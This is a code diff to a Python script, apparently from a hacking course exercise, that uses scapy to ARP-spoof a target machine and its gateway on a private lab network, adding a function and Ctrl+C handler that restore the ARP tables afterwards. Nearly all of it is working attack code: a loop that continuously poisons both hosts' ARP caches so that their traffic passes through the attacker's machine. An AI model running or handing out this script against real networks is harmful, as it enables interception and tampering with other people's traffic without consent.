@@ -1,4 +1,4 @@
-#!usr/bin/env python3
+#!usr/bin/env python
 
 import scapy.all as scapy
 import time
@@ -41,18 +41,44 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+# step 8 will be restoration
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(
+        op=2,
+        pdst=destination_ip,
+        hwdst=destination_mac,
+        psrc=source_ip,
+        hwsrc=source_mac,
+    )  # need this last field to set mac address back to source ip.
+    scapy.send(packet, count=4, verbose=False)
+
+
+restore("192.168.146.142", "192.168.146.2")
+
 # step 4 introduce while loop to keep packets rolling until attack is stopped
-
 sent_packets_count = 0
-while True:
-    # step 3 tell target ip that , i am router ip
-    spoof("192.168.146.142", "192.168.146.2")
-    # step tell router ip, i am target ip
-    spoof("192.168.146.2", "192.168.146.142")
-    sent_packets_count = sent_packets_count + 2
-    print("\r[+] Packets sent: " + str(sent_packets_count)),
-    # step 6 is adding comma to have it print on 1 line.
-    sys.stdout.flush()  # steps 6 is flushing the buffer where Python won't print until program stops. import sys
-    time.sleep(2.5)  # need to import time.
 
+target_ip = "192.168.146.142"
+gateway_ip = "192.168.146.2"
+
+# step 7 try/except statements.
+try:
+    while True:
+        # step 3 tell target ip that , i am router ip
+        spoof(target_ip, gateway_ip)
+        # step tell router ip, i am target ip
+        spoof(gateway_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+        print(
+            "\r[+] Packets sent: " + str(sent_packets_count)
+        ),  # end="") #python3 move comma inside paren end="" no sys import or bottom.
+        # step 6 is adding comma to have it print on 1 line.
+        sys.stdout.flush()  # step 6 is flushing the buffer where Python won't print until program stops. import sys
+        time.sleep(2)  # need to import time.
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C..........Resetting ARP tables......Please wait.\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
 # ctrl+c to stop
